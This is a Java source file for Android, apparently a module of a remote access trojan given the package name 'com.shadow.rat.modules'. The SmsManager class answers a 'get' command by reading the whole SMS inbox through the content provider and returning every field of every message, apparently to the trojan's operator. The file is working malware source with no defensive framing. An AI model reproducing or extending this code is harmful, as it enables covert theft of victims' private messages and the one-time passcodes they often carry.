package com.shadow.rat.modules;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class SmsManager implements Module {

    private final Context context;

    public SmsManager(Context context) {
        this.context = context;
    }

    @Override
    public String execute(String command) {
        if (command.equalsIgnoreCase("get")) {
            return getSmsMessages();
        }
        return "Unknown command for SmsManager. Available commands: get";
    }

    private String getSmsMessages() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                }
                sb.append(msgData).append("\n");
            } while (cursor.moveToNext());
        } else {
            sb.append("No SMS messages found.");
        }
        cursor.close();
        return sb.toString();
    }
}
